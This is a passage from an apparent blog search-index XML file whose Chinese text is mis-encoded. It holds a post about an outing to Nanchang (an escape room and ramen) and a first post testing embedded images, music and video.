ä¸Šæ—¶é—´ä¸å¤Ÿï¼Œæ‰€ä»¥æ”¹æˆäº†å¯†å®¤é€ƒè„±ï¼ˆè¡¥å……ä¸€ä¸‹ï¼Œæœ‰ä¸ªå½“åœ°äººå¸¦è·¯éå¸¸é‡è¦ğŸ˜ƒï¼‰</p><img src="/images/17.jpg" height="400" width="350" /><img src="/images/16.jpg" height="400" width="350" /><img src="/images/15.jpg" height="400" width="350" /><p>æ¸¸æˆä½“éªŒè¿˜ä¸é”™ï¼ˆé™¤äº†é‚£ä¸ªæ€•é¬¼çš„å¸ˆå…„ï¼‰ï¼Œè¿˜é€äº†ä¸€ä¸ªçºªå¿µå“ï¼ˆä¸‹é¢çš„æ˜¯ä¹°å¥¶èŒ¶é€çš„çºªå¿µå“ï¼‰ğŸ˜ƒ</p><img src="/images/20.jpg" height="400" width="350" /><p>æœ€åå»åƒäº†ç¢—æ‹‰é¢ï¼Œå‘³é“è¿˜æ˜¯ç›¸å½“ä¸é”™çš„ï¼Œå°±æ˜¯ä»·æ ¼æœ‰ç‚¹å°è´µ/(ã„’oã„’)/~~</p><p>é¥­åå»é€›äº†ä¸€ä¸‹ï¼Œå¸¦ç‚¹ä¸œè¥¿ç»™å®¤å‹ï¼Œæœ€åæ‰“çš„å›æ ¡</p><img src="/images/19.jpg" height="400" width="350" /><p>  è¿™æ¬¡è¡Œç¨‹è¿˜æ˜¯ä¸é”™çš„ï¼ˆæ¯”å‘†åœ¨å­¦æ ¡å¥½å¤šäº†ï¼‰ï¼Œå‘ç°å—æ˜Œè¿˜æ˜¯è›®å¥½ç©çš„ï¼Œä½†å°±æ˜¯ä¸çŸ¥é“ä¸‹æ¬¡å‡ºå»æ˜¯ä»€ä¹ˆæ—¶å€™äº†ğŸ˜”</p>]]></content>
      
      
      <categories>
          
          <category> ç”Ÿæ´» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¨±ä¹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æˆ‘çš„ç¬¬ä¸€ç¯‡æ–‡ç« </title>
      <link href="/post/My-First-Post.html"/>
      <url>/post/My-First-Post.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ–°çš„å¼€å§‹"><a href="#æ–°çš„å¼€å§‹" class="headerlink" title="æ–°çš„å¼€å§‹"></a>æ–°çš„å¼€å§‹</h2><p><em>è¿™æ˜¯æœ¬äººç¬¬ä¸€æ¬¡æ­åšå®¢ï¼Œèµ°äº†è®¸å¤šå¼¯è·¯ï¼Œç»è¿‡äº†æ— æ•°æ¬¡çš„å¤±è´¥ï¼Œæµªè´¹äº†å¤§é‡çš„æ—¶é—´ï¼Œä½†æœ€ç»ˆè¿˜æ˜¯æ­å»ºå®Œæˆã€‚åœ¨è¿™å…¶ä¸­ï¼Œæˆ‘è¯·æ•™äº†çŸ³å¸ˆå…„å’Œé«˜å¸ˆå…„ï¼Œå€Ÿé‰´äº†Bç«™çš„è§†é¢‘ï¼Œæ‰æœ€ç»ˆæˆåŠŸã€‚æœ€åï¼Œæˆ‘å¸Œæœ›è¿ˆå‡ºè¿™ä¸€å°æ­¥åèƒ½å¤Ÿç»§ç»­å‘å‰ï¼Œå¹¶æˆä¸ºæˆ‘æƒ³æˆä¸ºçš„äººã€‚</em></p><span id="more"></span><h3 id="éŸ³é¢‘æµ‹è¯•"><a href="#éŸ³é¢‘æµ‹è¯•" class="headerlink" title="éŸ³é¢‘æµ‹è¯•"></a>éŸ³é¢‘æµ‹è¯•</h3><h4 id="ç…§ç‰‡"><a href="#ç…§ç‰‡" class="headerlink" title="ç…§ç‰‡"></a>ç…§ç‰‡</h4><img src="/images/1.jpg" height="400" width="350" /><h4 id="éŸ³ä¹"><a href="#éŸ³ä¹" class="headerlink" title="éŸ³ä¹"></a>éŸ³ä¹</h4><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=400 height=86 src="//music.163.com/outchain/player?type=2&id=1477539203&auto=1&height=66"></iframe><h4 id="è§†é¢‘"><a href="#è§†é¢‘" class="headerlink" title="è§†é¢‘"></a>è§†é¢‘</h4><video src='/video/1.mp4' heigth='500px' controls>]]></content>
      
      
      <categories>
          
          <category> å¿ƒå¾— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ„Ÿæƒ³ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
